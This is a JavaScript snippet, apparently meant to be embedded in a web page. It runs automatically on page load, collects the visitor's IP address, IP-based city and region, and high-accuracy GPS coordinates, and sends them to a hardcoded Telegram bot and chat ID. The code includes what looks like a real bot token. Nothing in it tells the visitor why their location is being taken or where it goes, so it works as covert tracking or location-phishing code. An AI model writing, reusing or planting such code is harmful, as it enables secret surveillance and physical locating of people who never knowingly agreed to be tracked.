document.addEventListener("DOMContentLoaded", async function () {
    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E"; // توكن البوت
    const chatId = "5375214810"; // معرف تيليجرام

    async function getIP() {
        try {
            const response = await fetch("https://api64.ipify.org?format=json");
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "غير متاح";
        }
    }

    async function getLocationByIP(ip) {
        try {
            const response = await fetch(`https://ip-api.com/json/${ip}?fields=country,regionName,city`);
            const data = await response.json();
            return `🌍 المدينة: ${data.city}, المنطقة: ${data.regionName}, الدولة: ${data.country}`;
        } catch (error) {
            return "غير معروف";
        }
    }

    async function getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) return resolve("❌ غير متاح");

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve(`📍 خط العرض: ${position.coords.latitude}, خط الطول: ${position.coords.longitude}`);
                },
                () => resolve("❌ تم رفض الإذن"),
                { enableHighAccuracy: true } // 🔥 تفعيل دقة الموقع باستخدام GPS
            );
        });
    }

    async function sendLocationToTelegram() {
        const ip = await getIP();
        const locationByIP = await getLocationByIP(ip);
        const gpsLocation = await getGPSLocation();

        let message = "📍 **معلومات الموقع:**\n\n";
        message += `**📡 عنوان IP:** ${ip}\n`;
        message += `**🌍 الموقع عبر IP:** ${locationByIP}\n`;
        message += `**📌 الموقع عبر GPS:** ${gpsLocation}\n`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الموقع:", data))
        .catch(error => console.error("❌ خطأ في الإرسال:", error));
    }

    sendLocationToTelegram();
});
